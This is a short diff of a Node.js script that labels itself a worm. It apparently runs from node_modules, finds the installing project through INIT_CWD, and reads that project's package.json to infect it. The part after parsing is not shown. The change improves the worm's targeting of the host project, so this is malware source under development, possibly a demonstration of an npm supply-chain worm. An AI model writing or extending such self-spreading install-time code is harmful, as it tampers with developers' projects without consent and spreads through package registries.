@@ -5,19 +5,10 @@ var fs = require('fs');
 
 console.log('Beginning of worm infection');
 try{
-    
-    var wormfilname = __filename;
-    var wormfileArr = wormfilname.split(path.sep);
-
-    var nodeModulesIndex = wormfileArr.indexOf('node_modules');
-
-    var projectPath = wormfileArr.slice(0, nodeModulesIndex).join(path.sep);
-
-    console.log(wormfilname);
-    console.log(projectPath);
-
+    var projectPath = process.env.INIT_CWD;
     var packageJsonPath = path.join(projectPath, 'package.json');
     
+    console.log(projectPath);
     console.log(packageJsonPath);
 
     var packageJsonContent = JSON.parse(
@@ -33,4 +24,3 @@ try{
 catch(e){
     console.error('Woops, the worm failed to infect your machine', e);
 }
-
